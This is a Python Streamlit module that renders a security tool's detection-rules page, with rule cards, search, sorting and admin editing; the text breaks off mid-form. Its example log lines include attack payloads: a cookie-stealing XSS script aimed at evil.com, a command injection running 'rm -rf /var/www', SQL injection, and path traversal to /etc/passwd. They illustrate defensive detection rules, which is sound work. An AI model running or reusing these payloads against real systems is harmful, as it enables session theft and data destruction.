import html
import datetime as _dt

import streamlit as st
import streamlit.components.v1 as components

from database.models import DetectionRule
from auth.access_control import is_admin
from utils.validators import sanitize_text, validate_rule_condition
from services.audit_service import (
    log_action, ACTION_RULE_CREATE, ACTION_RULE_UPDATE,
    ACTION_RULE_DELETE, ACTION_RULE_TOGGLE, ACTION_RULE_PROPAGATE,
)
from config.settings import now_ist, RULE_GROUP_BY_OPTIONS, SEVERITY_ORDER
from services.recommendations import _RULE_ACTIONS
from database.init_db import get_ruleset_version, get_db_initialized_at

# ── Example log snippets per rule ─────────────────────────────────────────────
_RULE_EXAMPLES: dict[str, str] = {
    "SQL Injection Attempt":
        "2024-01-15 14:23:07 WARN  GET /search?q=' OR 1=1--&user=admin [192.168.1.42]",
    "Command Injection":
        "2024-01-15 14:23:45 WARN  POST /api/ping host='; rm -rf /var/www; echo 'pwned'",
    "XSS Attempt":
        "2024-01-15 14:24:01 WARN  GET /comment?text=<script>document.location='http://evil.com/'+document.cookie</script>",
    "Path Traversal Attempt":
        "2024-01-15 14:24:22 WARN  GET /download?file=../../etc/passwd [192.168.1.42]",
    "Directory Scanning":
        "2024-01-15 14:25:00 WARN  GET /admin/config.php 404  GET /.git/config 403  GET /backup.sql 404",
    "Abnormal HTTP Methods":
        "2024-01-15 14:25:30 WARN  TRACE /api/v1/users HTTP/1.1 200 [192.168.1.55]",
    "Dormant Account Activity":
        "2024-01-15 14:26:00 INFO  User 'svc_backup' authenticated — last login was 247 days ago",
    "Concurrent Sessions":
        "2024-01-15 14:26:15 WARN  User 'jsmith' active session from 192.168.1.10 AND 203.0.113.44 simultaneously",
    "Geographic Anomaly":
        "2024-01-15 14:27:00 WARN  Login from unusual location: user 'alee' authenticated from CN (last login: GB)",
    "Unusual Working Hours":
        "2024-01-15 23:47:33 INFO  User 'contractor1' accessed 142 records outside business hours",
    "Off-Hours Access":
        "2024-01-16 02:14:51 WARN  Successful login: user 'dbadmin' at 02:14 from 10.0.0.5",
    "Unauthorized Access Attempt":
        "2024-01-15 14:28:00 WARN  GET /admin/users HTTP/1.1 403 Forbidden [user=guest, IP=10.0.1.5]",
    "Privilege Escalation":
        "2024-01-15 14:29:10 CRITICAL sudo: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
    "Sensitive Resource Access":
        "2024-01-15 14:30:00 WARN  File read: /etc/shadow accessed by process 'python3' (PID 4821)",
    "API Key Misuse":
        "2024-01-15 14:31:00 ERROR  API auth failed: invalid_api_key for key sk-prod-...abc [endpoint=/v2/data]",
    "Session Hijacking Pattern":
        "2024-01-15 14:32:00 WARN  Session fixation detected: session_id unchanged after login for user 'bob'",
    "Account Lockout Event":
        "2024-01-15 14:33:00 WARN  Account 'alice' locked after 5 consecutive failed password attempts from 203.0.113.22",
    "Successful Login After Failures":
        "2024-01-15 14:34:00 INFO  Login SUCCESS for 'carol' after 7 FAILED attempts from 203.0.113.22",
    "Brute Force Attack":
        "2024-01-15 14:35:00 CRITICAL 148 failed logins from 203.0.113.22 in 60 seconds",
    "Repeated Failed Logins":
        "2024-01-15 14:36:00 HIGH User 'admin' had 12 failed logins in 300 seconds",
    "Rapid Login Attempts":
        "2024-01-15 14:37:00 HIGH 250 login attempts from 198.51.100.7 in 120 seconds",
    "Multiple User Failures":
        "2024-01-15 14:38:00 CRITICAL 45 different usernames failed login from 198.51.100.7 in 300 seconds",
    "Repeated Access Denials":
        "2024-01-15 14:39:00 MEDIUM 30 HTTP 403 responses to 192.168.1.99 in 60 seconds",
    "Error Rate Spike":
        "2024-01-15 14:40:00 HIGH 512 application errors in 60 seconds (baseline: 8/min)",
    "Service Crash Loop":
        "2024-01-15 14:41:00 HIGH Service 'nginx' crashed and restarted 6 times in 300 seconds",
    "Rapid Sequential Actions":
        "2024-01-15 14:42:00 MEDIUM User 'etl_svc' performed 850 API calls in 60 seconds",
    "Mass Data Access":
        "2024-01-15 14:43:00 CRITICAL User 'reports' accessed 12,000 customer records in 120 seconds",
    "Resource Exhaustion":
        "2024-01-15 14:44:00 HIGH OOM kill: process 'mysqld' used 98% RAM — system critical",
    "Unexpected Shutdown":
        "2024-01-15 14:45:00 HIGH System shutdown signal received (source: unknown) — 3 events in 300s",
    "Configuration Change":
        "2024-01-15 14:46:00 MEDIUM sshd_config modified by user 'deploy' — PermitRootLogin changed to yes",
    "Database Error Spike":
        "2024-01-15 14:47:00 MEDIUM 200 database errors in 60 seconds — possible injection attack",
}

# ── Plain-language rule descriptions ─────────────────────────────────────────
_RULE_PLAIN_DESC: dict[str, str] = {
    "SQL Injection Attempt":
        "Detects attempts to manipulate database queries by injecting SQL keywords into user-supplied input fields.",
    "Command Injection":
        "Identifies requests containing shell metacharacters or OS commands that may execute on the server.",
    "XSS Attempt":
        "Detects cross-site scripting payloads including <script> tags and javascript: URI schemes in requests.",
    "Path Traversal Attempt":
        "Catches attempts to navigate outside the web root using ../ sequences or URL-encoded equivalents.",
    "Directory Scanning":
        "Flags systematic requests to common sensitive paths (admin panels, config files, backup directories).",
    "Abnormal HTTP Methods":
        "Detects rarely-used HTTP methods (TRACE, CONNECT, WebDAV) used in reconnaissance and proxy attacks.",
    "Dormant Account Activity":
        "Triggers when an account that has been inactive for an extended period suddenly becomes active.",
    "Concurrent Sessions":
        "Alerts on a single account having multiple active sessions from different IP addresses simultaneously.",
    "Geographic Anomaly":
        "Detects logins from countries or regions not previously associated with the account.",
    "Unusual Working Hours":
        "Flags significant activity (files accessed, queries run) outside normal 09:00–17:00 business hours.",
    "Off-Hours Access":
        "Detects successful logins occurring between midnight and 05:00 when most environments are unattended.",
    "Unauthorized Access Attempt":
        "Catches HTTP 403 Forbidden and 401 Unauthorized responses indicating access control violations.",
    "Privilege Escalation":
        "Detects use of sudo, su, and similar privilege-elevation commands to gain root or admin access.",
    "Sensitive Resource Access":
        "Triggers on access to critical system files: /etc/passwd, /etc/shadow, SSH keys, and certificates.",
    "API Key Misuse":
        "Detects invalid, expired, or revoked API key usage indicating credential testing or key compromise.",
    "Session Hijacking Pattern":
        "Identifies session fixation, CSRF, and cookie manipulation patterns used to steal authenticated sessions.",
    "Account Lockout Event":
        "Detects when an account is locked after too many failed authentication attempts.",
    "Successful Login After Failures":
        "Flags a successful login that immediately follows multiple failed attempts — possible brute-force success.",
    "Brute Force Attack":
        "Behavioral rule: triggers when a single IP produces an abnormally high count of failed logins in a short window.",
    "Repeated Failed Logins":
        "Behavioral rule: tracks failed login counts per username and alerts when a threshold is exceeded.",
    "Rapid Login Attempts":
        "Behavioral rule: detects high-velocity login attempts from a single source, indicating an automated tool.",
    "Multiple User Failures":
        "Behavioral rule: identifies one IP attempting many different usernames — a credential stuffing attack.",
    "Repeated Access Denials":
        "Behavioral rule: alerts when a source generates many 403/401 errors, indicating systematic ACL probing.",
    "Error Rate Spike":
        "Behavioral rule: triggers when application error rates sharply exceed the baseline — possible attack or exploit.",
    "Service Crash Loop":
        "Behavioral rule: alerts when a service crashes and restarts repeatedly in a short period.",
    "Rapid Sequential Actions":
        "Behavioral rule: detects bot-like behaviour when a user account performs far more actions per minute than normal.",
    "Mass Data Access":
        "Behavioral rule: flags accounts that read an unusually large number of records rapidly — data exfiltration indicator.",
    "Resource Exhaustion":
        "Behavioral rule: detects out-of-memory, disk-full, and CPU saturation events that may indicate a DoS attack.",
    "Unexpected Shutdown":
        "Behavioral rule: alerts on unplanned system/service shutdowns that may result from exploit payloads.",
    "Configuration Change":
        "Behavioral rule: tracks changes to critical configuration files and alerts on unexpected modifications.",
    "Database Error Spike":
        "Behavioral rule: triggers when the database returns an elevated error rate suggesting injection or instability.",
}

# ── Presentation helpers ──────────────────────────────────────────────────────
_SEV_CLASS = {"CRITICAL": "critical", "HIGH": "high", "MEDIUM": "medium", "LOW": "low", "INFO": "info"}
# value -> UI label, e.g. "source_ip" -> "Source IP"
_GROUP_BY_LABEL = {v: k for k, v in RULE_GROUP_BY_OPTIONS.items()}


def _status_chips_html(rule, admin: bool) -> str:
    """Status chips shown in the always-visible card header (right side) so a rule's
    severity / enabled / published state is readable WITHOUT expanding the card.
    Publication (Published/Pending) is admin-only — IT Owners never see those words."""
    cls = _SEV_CLASS.get((rule.severity or "").upper(), "info")
    chips = [f'<span class="rule-badge rule-badge-{cls}">{html.escape((rule.severity or "").upper())}</span>']
    chips.append('<span class="rule-badge rule-badge-on">Enabled</span>' if rule.is_enabled
                 else '<span class="rule-badge rule-badge-off">Disabled</span>')
    if admin:
        chips.append('<span class="rule-badge rule-badge-prop">Published</span>' if rule.is_propagated
                     else '<span class="rule-badge rule-badge-pending">Pending</span>')
    if rule.rule_type == "custom":
        chips.append('<span class="rule-badge rule-badge-custom">Custom</span>')
    return '<div class="rule-badge-row">' + "".join(chips) + '</div>'


def compute_display_numbers(db) -> dict:
    """Map each rule id → a stable display number ('Rule #').

    Ordering: all STATIC (pattern) rules first, then BEHAVIORAL/custom rules; within
    each group, severity Critical→Low, then by creation time and id. Derived on every
    render, so disabled rules keep their slot, a delete frees and re-sequences the
    numbers, and the immutable DB primary key is never touched.
    """
    rules = db.query(DetectionRule).all()
    rules.sort(key=lambda r: (
        0 if r.is_static else 1,
        -SEVERITY_ORDER.get((r.severity or "").upper(), 0),
        r.created_at or now_ist(),
        r.id,
    ))
    return {r.id: i for i, r in enumerate(rules, start=1)}


def _fmt_dt(value) -> str:
    """Format a datetime (or ISO-8601 string) as 'DD-MM-YYYY HH:MM' (IST display)."""
    if value is None:
        return "N/A"
    if isinstance(value, str):
        # Stored ISO 8601 (e.g. db_initialized_at) → parse so we can reformat.
        try:
            value = _dt.datetime.fromisoformat(value)
        except ValueError:
            return value.replace("T", " ")[:16]
    try:
        return value.strftime("%d-%m-%Y %H:%M")
    except (AttributeError, ValueError):
        return str(value)[:16]


def _fmt_window(seconds) -> "str | None":
    if seconds is None:
        return None
    if seconds == 0:
        return "Point-in-time"
    if seconds % 3600 == 0:
        h = seconds // 3600
        return f"{h} hour" + ("s" if h > 1 else "")
    if seconds % 60 == 0:
        return f"{seconds // 60} min"
    return f"{seconds}s"


def _rule_kind_label(rule) -> str:
    if rule.rule_type == "custom":
        return "Custom"
    if not rule.is_static:
        return "Behavioral"
    return "Static"


def _chips_html(rule) -> str:
    """Parameter chips shown to ALL roles (read-only for IT Owners) so the active
    threshold / window / scope are visible at a glance."""
    chips = [f'<span class="rule-chip">Type <b>{_rule_kind_label(rule)}</b></span>']
    if rule.default_threshold is not None:
        chips.append(f'<span class="rule-chip">Threshold <b>{int(rule.default_threshold)}</b></span>')
    win = _fmt_window(rule.time_window_seconds)
    if win:
        chips.append(f'<span class="rule-chip">Window <b>{html.escape(win)}</b></span>')
    if rule.group_by == "global":
        chips.append('<span class="rule-chip">Scope <b>Whole file</b></span>')
    elif rule.group_by:
        label = _GROUP_BY_LABEL.get(rule.group_by, rule.group_by)
        chips.append(f'<span class="rule-chip">Grouped by <b>{html.escape(label)}</b></span>')
    return '<div class="rule-chips">' + "".join(chips) + '</div>'


def _framework_html(refs: "str | None") -> str:
    if not refs:
        return ""
    tags = [t.strip() for t in refs.replace("·", "|").split("|") if t.strip()]
    if not tags:
        return ""
    spans = "".join(f'<span class="fw-tag">{html.escape(t)}</span>' for t in tags)
    return '<div class="fw-label">Framework alignment</div><div class="fw-tags">' + spans + '</div>'


def render_rules_page(user, db):
    admin = is_admin()

    # After a Publish / edit-Save (which change the page-level "pending" set), we do a full
    # rerun so the "Publish all pending (N)" count + tab counts resync; this flag then keeps
    # the user on the rule they were working on instead of jumping.
    scroll_id = st.session_state.pop("_rules_scroll_to_id", None)

    if admin:
        st.markdown(
            '<div class="page-header">'
            '<div class="page-title">Threat Detection Rules</div>'
            '<div class="page-subtitle">Create, edit, enable/disable, and delete detection rules — changes apply immediately</div>'
            "</div>",
            unsafe_allow_html=True,
        )
    else:
        st.markdown(
            '<div class="page-header">'
            '<div class="page-title">Detection Rules</div>'
            '<div class="page-subtitle">Active threat detection rules — what the system monitors, how it decides, and why</div>'
            "</div>",
            unsafe_allow_html=True,
        )

    # Stable display numbers + the DB reseed date are computed once and threaded into
    # every card so numbering is consistent across the whole list.
    display_numbers = compute_display_numbers(db)
    db_initialized_at = get_db_initialized_at(db)

    # GLOBAL search + sort — moved ABOVE the "Last updated" line and operating across the
    # COMPLETE rule set (both Static and Behavioral), not per-tab / per-category.
    search, sort_choice = _render_global_search_sort(admin)

    # A single, unobtrusive "last updated" line (no box) — same for every role (#12).
    _, last_updated = get_ruleset_version(db)
    st.caption(f"Last updated {_fmt_dt(last_updated)} IST")

    # Load ALL rules once. IT Owners only ever see published rules (#16). The global
    # search + sort/status filter is applied to this complete set, then the result is
    # split into the two tabs for display (with live match counts in the tab labels).
    q_rules = db.query(DetectionRule)
    if not admin:
        q_rules = q_rules.filter_by(is_propagated=True)
    all_rules = q_rules.all()
    total = len(all_rules)

    result = list(all_rules)
    q = (search or "").strip().lower()
    if q:
        result = [r for r in result if _rule_matches(r, q)]
    if sort_choice.startswith(("Status:", "Type:")):
        result = _filter_by_status(result, sort_choice)
        _sort_rules(result, "Severity (high→low)", display_numbers)
    else:
        _sort_rules(result, sort_choice, display_numbers)

    st.caption(
        f"Showing **{len(result)}** of {total} rules across all types &nbsp;·&nbsp; "
        f"**{sum(1 for r in result if r.is_enabled)}** enabled &nbsp;·&nbsp; "
        f"{sum(1 for r in result if not r.is_enabled)} disabled"
    )

    static_rules = [r for r in result if r.is_static]
    behavioral_rules = [r for r in result if not r.is_static]

    # Publish-all (admin only) is rendered immediately before the tab strip and pinned to
    # its right edge via CSS (yellow = pending action). See _render_publish_all.
    if admin:
        _render_publish_all(db, user)

    tab_static, tab_behavioral = st.tabs(
        [f"Static Rules ({len(static_rules)})", f"Behavioral Rule ({len(behavioral_rules)})"]
    )

    with tab_static:
        st.markdown(
            '<div class="info-box">'
            '<strong>Static rules</strong> match individual log lines using text patterns. '
            'Each line is checked as it is parsed — zero accumulation needed.'
            '</div>',
            unsafe_allow_html=True,
        )
        _render_rule_cards(db, user, admin, static_rules, display_numbers, db_initialized_at, scroll_id)

    with tab_behavioral:
        st.markdown(
            '<div class="info-box">'
            '<strong>Behavioral rules</strong> count events over a time window and '
            'raise a threat only when the count exceeds the configured threshold — catching patterns '
            'that individual lines miss.'
            '</div>',
            unsafe_allow_html=True,
        )
        _render_rule_cards(db, user, admin, behavioral_rules, display_numbers, db_initialized_at, scroll_id)

    # Keep the just-published / just-saved rule in view after the full rerun.
    if scroll_id is not None:
        _scroll_to_rule()

    if admin:
        st.divider()
        st.subheader("Add New Rule")
        _show_add_rule_form(db, user)


def _scroll_to_rule() -> None:
    """Keep the just-published / just-saved rule in view after a full rerun (the rule emits
    #rule-scroll-anchor). Polls briefly because the card renders just after this iframe."""
    components.html(
        """
        <script>
        (function() {
          const doc = window.parent.document;
          let n = 0;
          const t = setInterval(function() {
            const el = doc.getElementById('rule-scroll-anchor');
            if (el) { el.scrollIntoView({block: "center"}); }
            if (++n > 9) clearInterval(t);
          }, 70);
        })();
        </script>
        """,
        height=0,
    )


def _render_publish_all(db, user):
    """Admin-only button (pinned to the right of the tab strip) to publish every staged
    rule at once. Yellow = a pending action awaiting publication (request #13)."""
    pending = db.query(DetectionRule).filter_by(is_propagated=False).count()
    if not pending:
        return
    if st.button(f"⇪ Publish all pending ({pending})", key="publish_all_btn"):
        rows = db.query(DetectionRule).filter_by(is_propagated=False).all()
        for r in rows:
            r.is_propagated = True
            r.updated_at = now_ist()
        db.commit()
        log_action(user.id, ACTION_RULE_PROPAGATE, db,
                   details=f"Published {len(rows)} pending rule(s) to all IT Owners.")
        st.success(f"Published {len(rows)} rule(s) — now active for all IT Owners.")
        st.rerun()


def _filter_by_status(rules: list, choice: str) -> list:
    """Status / type filters surfaced in the sort dropdown (requests #18, #4)."""
    if choice == "Status: Enabled":
        return [r for r in rules if r.is_enabled]
    if choice == "Status: Disabled":
        return [r for r in rules if not r.is_enabled]
    if choice == "Status: Pending":
        return [r for r in rules if not r.is_propagated]
    if choice == "Status: Published":
        return [r for r in rules if r.is_propagated]
    if choice == "Type: Custom":
        return [r for r in rules if r.rule_type == "custom"]
    return rules


def _rule_matches(rule, q: str) -> bool:
    parts = [rule.rule_name or "", rule.severity or "", rule.framework_refs or "",
             rule.detection_logic or "", _rule_kind_label(rule)]
    return q in " ".join(parts).lower()


def _sort_rules(rules: list, sort_choice: str, display_numbers: dict) -> None:
    sev = lambda r: SEVERITY_ORDER.get((r.severity or "").upper(), 0)
    name = lambda r: (r.rule_name or "").lower()
    if sort_choice == "Name (A–Z)":
        rules.sort(key=name)
    elif sort_choice == "Severity (low→high)":
        rules.sort(key=lambda r: (sev(r), name(r)))
    elif sort_choice == "Rule #":
        rules.sort(key=lambda r: display_numbers.get(r.id, 10**9))
    else:  # "Severity (high→low)" — default
        rules.sort(key=lambda r: (-sev(r), name(r)))


def _render_global_search_sort(admin: bool):
    """Single search box + sort/filter dropdown that operate across the COMPLETE rule set
    (both Static and Behavioral) — NOT per tab / category. Returns (search, sort_choice)."""
    c_search, c_sort = st.columns([3, 1])
    with c_search:
        search = st.text_input(
            "Search rules",
            placeholder="🔍  Search all rules by name, severity, framework…",
            label_visibility="collapsed", key="rules_search",
        )
        st.button("✕", key="rules_clear",
                  on_click=lambda: st.session_state.update({"rules_search": ""}),
                  help="Clear search")
    with c_sort:
        # The dropdown also exposes status filters (request #18). Publication-status
        # filters (Pending / Published) are admin-only.
        sort_options = ["Severity (high→low)", "Severity (low→high)", "Name (A–Z)", "Rule #",
                        "Status: Enabled", "Status: Disabled"]
        if admin:
            sort_options += ["Status: Pending", "Status: Published"]
        # "Type: Custom" shows only user-created (custom) rules — available to both roles.
        sort_options.append("Type: Custom")
        sort_choice = st.selectbox(
            "Sort rules", sort_options, label_visibility="collapsed", key="rules_sort",
        )
    return search, sort_choice


def _render_rule_cards(db, user, admin: bool, rules: list,
                       display_numbers: dict, db_initialized_at, scroll_id=None):
    """Render the rule cards for an already filtered + sorted slice of the global list.

    Rendered directly (no fragment wrapper) so the card's box height/alignment is exactly
    the original — chips overlay + expander are direct children of the keyed container.
    Status-changing actions do a full rerun (so page counts stay accurate) and scroll the
    user back to the rule via the #rule-scroll-anchor."""
    if not rules:
        st.markdown('<div class="info-box">No rules match your search.</div>',
                    unsafe_allow_html=True)
        return

    user_id = getattr(user, "id", None)
    for rule in rules:
        # The keyed container draws the box (border, radius, coloured left edge from
        # st-key-rulecard_<sev>_<id>). Chips overlay + expander are direct children so the
        # CSS positions them exactly as designed (no extra nesting / gap).
        sev_cls = _SEV_CLASS.get((rule.severity or "").upper(), "info")
        editing = admin and (st.session_state.get("editing_rule_id") == rule.id)
        with st.container(key=f"rulecard_{sev_cls}_{rule.id}"):
            anchor = '<span id="rule-scroll-anchor"></span>' if rule.id == scroll_id else ''
            st.markdown(
                f'<div class="rule-chips-overlay">{anchor}{_status_chips_html(rule, admin)}</div>',
                unsafe_allow_html=True,
            )
            with st.expander(f"**{rule.rule_name}**", expanded=editing):
                if admin:
                    col_main, col_ctrl = st.columns([3, 1])
                    with col_main:
                        _render_rule_card(rule, True, display_numbers, db_initialized_at, db, user_id)
                    with col_ctrl:
                        _admin_rule_controls(rule, db, user_id)
                else:
                    _render_rule_card(rule, False, display_numbers, db_initialized_at)


def _render_rule_card(rule: DetectionRule, admin: bool,
                      display_numbers: dict, db_initialized_at, db=None, user_id=None):
    """Data-driven rule card. Shows every field required for an operator to understand
    the rule: name, severity, status, propagation, detection logic, threshold/window/
    scope, why-suspicious, security impact, concise recommended action, framework
    alignment, and an example. IT Owners see the full detail read-only; only the raw
    technical condition stays admin-only."""
    # A SINGLE timestamp at the top (shown to both Admins and IT Owners): "Created · <date>"
    # for a freshly seeded / custom-created rule, switching to "Updated · <date>" once the
    # rule has been edited. Default (seeded) rules use the DB initialization/reseed date.
    created_base = db_initialized_at if rule.created_by is None else rule.created_at
    edited = (rule.updated_at and rule.created_at
              and (rule.updated_at - rule.created_at).total_seconds() > 2)
    if edited:
        date_line = f"Updated &nbsp;·&nbsp; {html.escape(_fmt_dt(rule.updated_at))} IST"
    else:
        date_line = f"Created &nbsp;·&nbsp; {html.escape(_fmt_dt(created_base))} IST"
    st.caption(date_line)

    # While this rule is being edited, render the Edit form HERE — directly below the
    # date, in the WIDE main column — instead of in the narrow controls column. This keeps
    # the form readable and stops the card from stretching the right column and dragging
    # the page to the bottom (request #5 follow-up).
    if admin and db is not None and st.session_state.get("editing_rule_id") == rule.id:
        _show_edit_form(rule, db, user_id)
        return

    # Prominent parameter chips (threshold / window / scope) — visible to all roles
    st.markdown(_chips_html(rule), unsafe_allow_html=True)

    # What it detects (curated per-rule text for the built-in library; custom rules
    # rely on their Detection-logic / Why-suspicious fields instead).
    plain_desc = _RULE_PLAIN_DESC.get(rule.rule_name) or ""
    if plain_desc:
        st.markdown(f"**What it detects:** {plain_desc}")

    # Detection logic (how / when it fires)
    if rule.detection_logic:
        st.markdown(
            f'<div class="rule-logic"><strong>Detection logic:</strong> {html.escape(rule.detection_logic)}</div>',
            unsafe_allow_html=True,
        )

    # Why suspicious / security impact — prefer the rule's own fields (so admin custom
    # rules show them too), falling back to the built-in library for seeded rules.
    rec = _RULE_ACTIONS.get(rule.rule_name)
    why = rule.why_suspicious or (rec.get("why") if rec else "")
    impact = rule.security_impact or (rec.get("impact") if rec else "")
    if why:
        st.markdown(
            f'<div class="rule-why"><strong>Why suspicious:</strong> {html.escape(why)}</div>',
            unsafe_allow_html=True,
        )
    if impact:
        st.markdown(
            f'<div class="rule-impact"><strong>Security impact:</strong> {html.escape(impact)}</div>',
            unsafe_allow_html=True,
        )

    # Recommended action — concise (<= 2 lines): prefer the rule's own action
    action = rule.recommended_action or (rec["actions"][0] if rec else "")
    if action:
        st.markdown(
            f'<div class="rule-action"><strong>Recommended action:</strong> {html.escape(action)}</div>',
            unsafe_allow_html=True,
        )

    # Framework alignment tags (MITRE / NIST / ISO / CERT-In)
    fw = _framework_html(rule.framework_refs)
    if fw:
        st.markdown(fw, unsafe_allow_html=True)

    # Example log line
    example = rule.example_log or _RULE_EXAMPLES.get(rule.rule_name, "")
    if example:
        st.markdown(
            f'<div class="rule-example"><strong>Example:</strong><br><code>{html.escape(example)}</code></div>',
            unsafe_allow_html=True,
        )

    # Admin-only: raw technical condition
    if admin:
        with st.expander("Technical condition (admin only)", expanded=False):
            st.code(rule.condition, language="text")
            if rule.default_threshold is not None:
                st.markdown(
                    f"**Threshold:** `{rule.default_threshold}` &nbsp;·&nbsp; "
                    f"**Window:** `{rule.time_window_seconds or 0}s` &nbsp;·&nbsp; "
                    f"**Group by:** `{rule.group_by or 'n/a'}`"
                )

    num = display_numbers.get(rule.id, "—")
    st.caption(f"Rule #{num}")


def _admin_rule_controls(rule: DetectionRule, db, user_id):
    kp = f"rule_{rule.id}"

    # Every action does a FULL rerun so the page-level counts ("Publish all pending (N)",
    # "X enabled · Y disabled", tab counts) stay accurate; a scroll-back flag then keeps the
    # user on this rule instead of jumping to the top/bottom.

    # Staged rules show a Publish button to make them live for every IT Owner.
    if not rule.is_propagated:
        if st.button("⇪ Publish", key=f"{kp}_propagate", width='stretch', type="primary"):
            rule.is_propagated = True
            rule.updated_at = now_ist()
            db.commit()
            log_action(user_id, ACTION_RULE_PROPAGATE, db,
                       details=f"Rule '{rule.rule_name}' published to all IT Owners.")
            # Full rerun so the page-level "Publish all pending (N)" count resyncs; the flag
            # scrolls back to this rule afterwards so the user keeps their place.
            st.session_state["_rules_scroll_to_id"] = rule.id
            st.rerun()

    if st.button(
        "Disable" if rule.is_enabled else "Enable",
        key=f"{kp}_toggle",
        width='stretch',
        type="secondary" if rule.is_enabled else "primary",
    ):
        rule.is_enabled = not rule.is_enabled
        # Enabling/disabling re-stages the rule (→ Pending), exactly like editing: the admin
        # validates the change in their own Home analysis before publishing it to IT Owners.
        rule.is_propagated = False
        rule.updated_at = now_ist()
        db.commit()
        state = "enabled" if rule.is_enabled else "disabled"
        log_action(
            user_id, ACTION_RULE_TOGGLE, db,
            details=f"Rule '{rule.rule_name}' {state} (staged — pending publish).",
        )
        # Full rerun so the "Publish all pending (N)" + enabled/disabled counts resync;
        # scroll back to this rule.
        st.session_state["_rules_scroll_to_id"] = rule.id
        st.rerun()

    if st.button("Edit", key=f"{kp}_edit", width='stretch'):
        st.session_state["editing_rule_id"] = rule.id
        st.session_state["_rules_scroll_to_id"] = rule.id
        st.rerun()

    if st.button("Delete", key=f"{kp}_delete", width='stretch'):
        st.session_state[f"confirm_delete_{rule.id}"] = True

    if st.session_state.pop(f"confirm_delete_{rule.id}", False):
        db.delete(rule)
        db.commit()
        log_action(user_id, ACTION_RULE_DELETE, db, details=f"Rule '{rule.rule_name}' deleted.")
        st.rerun()   # full rerun so the card is removed from the list


def _show_edit_form(rule: DetectionRule, db, user_id):
    st.markdown("---")
    st.markdown("**Edit Rule**")
    # Threshold/window are editable for any rule that uses them — including behavioral
    # rules stored as is_static=True with a threshold (e.g. "Successful Login After
    # Failures"), which the previous form could not edit.
    has_threshold = (rule.default_threshold is not None) or (not rule.is_static)
    is_custom = rule.rule_type == "custom"

    # Pre-fill why/impact/example from the rule, falling back to the built-in library
    # so editing a seeded rule doesn't silently blank those sections.
    _rec = _RULE_ACTIONS.get(rule.rule_name)
    why_default = rule.why_suspicious or (_rec.get("why") if _rec else "") or ""
    impact_default = rule.security_impact or (_rec.get("impact") if _rec else "") or ""
    example_default = rule.example_log or _RULE_EXAMPLES.get(rule.rule_name, "") or ""

    with st.form(f"edit_rule_{rule.id}"):
        new_logic  = st.text_area("Detection logic (plain language)",
                                  value=rule.detection_logic or "", max_chars=500, height=70)
        new_why    = st.text_area("Why suspicious", value=why_default, max_chars=500, height=70)
        new_impact = st.text_area("Security impact", value=impact_default, max_chars=500, height=70)
        new_action = st.text_area("Recommended action (concise, max 2 lines)",
                                  value=rule.recommended_action or "", max_chars=300, height=70)
        new_example = st.text_area("Example log line", value=example_default, max_chars=500, height=70)
        new_cond   = st.text_area("Condition (regex or metric key)", value=rule.condition, height=80)
        sev_opts   = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        sev_index  = sev_opts.index(rule.severity) if rule.severity in sev_opts else 0
        new_sev    = st.selectbox("Severity", sev_opts, index=sev_index)
        new_fw     = st.text_input("Framework references", value=rule.framework_refs or "",
                                   max_chars=255,
                                   help="MITRE / NIST / ISO / CERT-In, separated by ·")

        new_thresh = new_window = new_group = None
        if has_threshold:
            new_thresh = st.number_input("Threshold", min_value=1, max_value=1000000,
                                          value=int(rule.default_threshold or 5))
            new_window = st.number_input("Time Window (seconds)", min_value=0, max_value=86400,
                                          value=int(rule.time_window_seconds or 300))
        if is_custom:
            gb_labels = list(RULE_GROUP_BY_OPTIONS.keys())
            current_label = _GROUP_BY_LABEL.get(rule.group_by or "global", gb_labels[-1])
            gb_index = gb_labels.index(current_label) if current_label in gb_labels else len(gb_labels) - 1
            new_group_label = st.selectbox("Group by", gb_labels, index=gb_index)
            new_group = RULE_GROUP_BY_OPTIONS[new_group_label]

        col_save, col_cancel = st.columns(2)
        save   = col_save.form_submit_button("Save Changes", type="primary")
        cancel = col_cancel.form_submit_button("Cancel")

    if save:
        valid_cond, err = validate_rule_condition(new_cond)
        if not valid_cond:
            st.error(err)
        else:
            rule.detection_logic = sanitize_text(new_logic, 500) or None
            rule.why_suspicious = sanitize_text(new_why, 500) or None
            rule.security_impact = sanitize_text(new_impact, 500) or None
            rule.recommended_action = sanitize_text(new_action, 300) or None
            rule.example_log = sanitize_text(new_example, 500) or None
            rule.condition   = new_cond
            rule.severity    = new_sev
            rule.framework_refs = sanitize_text(new_fw, 255) or None
            if new_thresh is not None:
                rule.default_threshold   = int(new_thresh)
                rule.time_window_seconds = int(new_window)
            if new_group is not None:
                rule.group_by = new_group
            # Editing re-stages the rule: it returns to "Pending" so the admin can
            # re-test it on Home before publishing the change to all IT Owners.
            rule.is_propagated = False
            rule.updated_at = now_ist()
            db.commit()
            log_action(user_id, ACTION_RULE_UPDATE, db, details=f"Rule '{rule.rule_name}' updated (staged).")
            st.session_state.pop("editing_rule_id", None)
            # Editing re-stages the rule (Published → Pending), which changes the page-level
            # "Publish all pending (N)" count — so do a FULL rerun to resync it, then scroll
            # back to this rule so the user keeps their place.
            st.session_state["_rules_scroll_to_id"] = rule.id
            st.rerun()

    if cancel:
        st.session_state.pop("editing_rule_id", None)
        st.session_state["_rules_scroll_to_id"] = rule.id
        st.rerun()


def _show_add_rule_form(db, user):
    # The rule-kind selector lives OUTSIDE the form so changing it reruns and shows the
    # right fields (Streamlit forms don't re-render on widget change until submit).
    _KIND_STATIC = "Static Rules"
    _KIND_BEHAVIORAL = "Behavioral Rules"
    kind = st.radio(
        "Rule kind",
        [_KIND_STATIC, _KIND_BEHAVIORAL],
        horizontal=True,
        key="add_rule_kind",
        help="Behavioral rules let you build new detection logic from the UI — no code or "
             "redeploy needed: a pattern is counted and grouped, firing at your threshold.",
    )
    is_custom = (kind == _KIND_BEHAVIORAL)

    with st.container(border=True):
        with st.form("add_rule_form", clear_on_submit=True):
            col_a, col_b = st.columns(2)
            with col_a:
                rule_name = st.text_input("Rule Name *", max_chars=150)
            with col_b:
                severity  = st.selectbox("Severity *", ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"])

            if is_custom:
                condition = st.text_area(
                    "Match pattern *",
                    placeholder="A keyword, several separated by | (e.g. failed login|invalid password), "
                                "or a full regex.",
                    height=70,
                    help="The pattern is matched against each log line; matches are counted and grouped.",
                )
                col_g, col_t, col_w = st.columns(3)
                with col_g:
                    group_label = st.selectbox("Group by *", list(RULE_GROUP_BY_OPTIONS.keys()))
